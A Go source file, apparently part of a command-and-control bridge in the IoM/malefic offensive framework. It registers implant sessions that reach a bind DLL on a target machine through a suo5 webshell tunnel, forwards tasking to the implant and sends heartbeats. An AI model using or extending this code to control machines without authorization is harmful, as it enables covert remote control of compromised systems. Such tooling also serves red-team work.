package main

import (
	"context"
	"fmt"
	"time"

	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/IoM-go/proto/services/listenerrpc"
	"github.com/chainreactors/logs"
)

// Session represents a single implant session managed by the bridge.
// Each session owns a Channel that communicates with the malefic bind DLL
// on the target through the malefic protocol over suo5.
type Session struct {
	ID         string
	PipelineID string
	ListenerID string

	channel ChannelIface
}

// NewSession reads the malefic handshake from the DLL (SysInfo + Modules)
// and registers the session with the server.
func NewSession(
	rpc listenerrpc.ListenerRPCClient,
	ctx context.Context,
	id, pipelineID, listenerID string,
	channel ChannelIface,
) (*Session, error) {
	// Read registration data from DLL via malefic handshake
	reg, err := channel.Handshake()
	if err != nil {
		return nil, fmt.Errorf("handshake: %w", err)
	}

	sess := &Session{
		ID:         id,
		PipelineID: pipelineID,
		ListenerID: listenerID,
		channel:    channel,
	}

	// Use real data from the DLL
	if reg.Name == "" {
		reg.Name = fmt.Sprintf("webshell-%s", id[:8])
	}

	_, err = rpc.Register(ctx, &clientpb.RegisterSession{
		SessionId:    id,
		PipelineId:   pipelineID,
		ListenerId:   listenerID,
		RawId:        channel.SessionID(),
		RegisterData: reg,
		Target:       fmt.Sprintf("webshell://%s", id),
	})
	if err != nil {
		return nil, fmt.Errorf("register session: %w", err)
	}

	logs.Log.Importantf("session registered: %s (name=%s, modules=%d, sid=%d)", id, reg.Name, len(reg.Module), channel.SessionID())
	return sess, nil
}

// HandleUnary forwards a Spite request through the malefic channel to the
// bind DLL and returns a single response. Use for non-streaming tasks.
func (s *Session) HandleUnary(taskID uint32, req *implantpb.Spite) (*implantpb.Spite, error) {
	return s.channel.Forward(taskID, req)
}

// OpenTaskStream registers a persistent response channel for a streaming task.
// Returns a channel that receives all DLL responses for this taskID.
func (s *Session) OpenTaskStream(taskID uint32) <-chan *implantpb.Spite {
	return s.channel.OpenStream(taskID)
}

// SendTaskSpite sends a spite to the DLL for a task (streaming or initial request).
func (s *Session) SendTaskSpite(taskID uint32, spite *implantpb.Spite) error {
	return s.channel.SendSpite(taskID, spite)
}

// CloseTaskStream cleans up a streaming task's response channel.
func (s *Session) CloseTaskStream(taskID uint32) {
	s.channel.CloseStream(taskID)
}

// Checkin sends a heartbeat for this session.
func (s *Session) Checkin(rpc listenerrpc.ListenerRPCClient, ctx context.Context) {
	_, err := rpc.Checkin(ctx, &implantpb.Ping{
		Nonce: int32(time.Now().Unix() & 0x7FFFFFFF),
	})
	if err != nil {
		logs.Log.Debugf("checkin failed for %s: %v", s.ID, err)
	}
}

// Close shuts down the session's malefic channel.
// The server will mark the session dead when checkins stop.
func (s *Session) Close() error {
	logs.Log.Importantf("session %s closing (server will mark dead after checkin timeout)", s.ID)
	if s.channel != nil {
		s.channel.CloseAllStreams()
		return s.channel.Close()
	}
	return nil
}

// Alive returns true if the underlying malefic channel is still connected.
func (s *Session) Alive() bool {
	if s.channel == nil {
		return false
	}
	return !s.channel.IsClosed()
}
